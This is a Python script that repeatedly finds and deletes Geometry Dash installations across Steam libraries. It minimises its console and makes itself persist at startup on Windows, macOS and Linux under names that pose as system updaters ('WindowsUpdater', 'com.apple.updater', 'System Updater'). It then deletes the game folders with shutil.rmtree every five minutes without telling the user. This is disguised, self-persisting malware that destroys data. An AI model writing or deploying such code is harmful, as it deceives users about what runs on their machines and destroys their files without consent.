#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Apr  7 12:48:48 2026

@author: mm
"""

import os
import time
import sys
import shutil
import subprocess
import platform
import re

def hide_console():
    """Hide the console window on Windows"""
    if platform.system() == "Windows":
        try:
            import ctypes
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 6)  # SW_MINIMIZE
        except:
            pass

def parse_vdf(content):
    """Simple VDF parser without external dependencies"""
    result = {}
    stack = [result]
    current_key = None
    
    # Remove comments and normalize whitespace
    lines = content.split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('//'):
            continue
            
        # Handle quotes
        if '"' in line:
            parts = re.findall(r'"([^"]*)"', line)
            
            if len(parts) >= 2:
                key, value = parts[0], parts[1]
                if value == '{':
                    # Start of a new section
                    new_dict = {}
                    stack[-1][key] = new_dict
                    stack.append(new_dict)
                    current_key = None
                else:
                    # Key-value pair
                    stack[-1][key] = value
                    current_key = key
            elif len(parts) == 1 and line.endswith('{'):
                # Start of a section with just a key
                key = parts[0]
                new_dict = {}
                stack[-1][key] = new_dict
                stack.append(new_dict)
                current_key = None
            elif line == '}':
                # End of a section
                if len(stack) > 1:
                    stack.pop()
    
    return result

def get_steam_libraries():
    """Find all Steam library folders"""
    system = platform.system()
    paths = []

    if system == "Windows":
        default = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
    elif system == "Darwin":
        default = os.path.expanduser("~/Library/Application Support/Steam")
    else:  # Linux
        default = os.path.expanduser("~/.steam/steam")

    vdf_path = os.path.join(default, "steamapps", "libraryfolders.vdf")

    if not os.path.exists(vdf_path):
        return [os.path.join(default, "steamapps")]

    try:
        with open(vdf_path, "r", encoding="utf-8") as f:
            content = f.read()
            data = parse_vdf(content)
    except Exception as e:
        print(f"Error reading VDF file: {e}")
        return [os.path.join(default, "steamapps")]

    libs = []
    libraryfolders = data.get("libraryfolders", {})
    
    # Handle different VDF formats
    for key, value in libraryfolders.items():
        if isinstance(value, dict) and "path" in value:
            libs.append(os.path.join(value["path"], "steamapps"))
        elif isinstance(value, str):
            # Some VDF formats might directly store the path
            libs.append(os.path.join(value, "steamapps"))

    return libs


def find_geometry_dash_install():
    """Find Geometry Dash install across all Steam libraries"""
    gd_paths = []

    for lib in get_steam_libraries():
        install_path = os.path.join(lib, "common", "Geometry Dash")
        if os.path.exists(install_path):
            gd_paths.append(install_path)

    return gd_paths


def delete_geometry_dash_data(paths):
    """Delete Geometry Dash data from the given paths"""
    for path in paths:
        try:
            if os.path.exists(path):
                # Try to delete the directory and all its contents
                shutil.rmtree(path, ignore_errors=True)
                print(f"Deleted: {path}")
        except Exception as e:
            print(f"Error deleting {path}: {e}")

def setup_persistence():
    """Set up the script to run on system startup"""
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])
    
    if system == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
        except:
            pass
    
    elif system == "Darwin":  # macOS
        try:
            launch_agents_path = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(launch_agents_path, exist_ok=True)
            
            plist_path = os.path.join(launch_agents_path, "com.apple.updater.plist")
            with open(plist_path, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>""")
            subprocess.run(["launchctl", "load", plist_path], check=False)
        except:
            pass
    
    elif system == "Linux":
        try:
            autostart_path = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_path, exist_ok=True)
            
            desktop_path = os.path.join(autostart_path, "system-updater.desktop")
            with open(desktop_path, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Updater
Exec={script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            os.chmod(desktop_path, 0o755)
        except:
            pass

def main():
    # Hide the console window
    hide_console()
    
    # Set up persistence to run on startup
    setup_persistence()
    
    # Main loop to repeatedly delete Geometry Dash data
    while True:
        gd_paths = find_geometry_dash_install()
        if gd_paths:
            delete_geometry_dash_data(gd_paths)
        
        # Wait for 5 minutes before checking again
        time.sleep(300)

if __name__ == "__main__":
    main()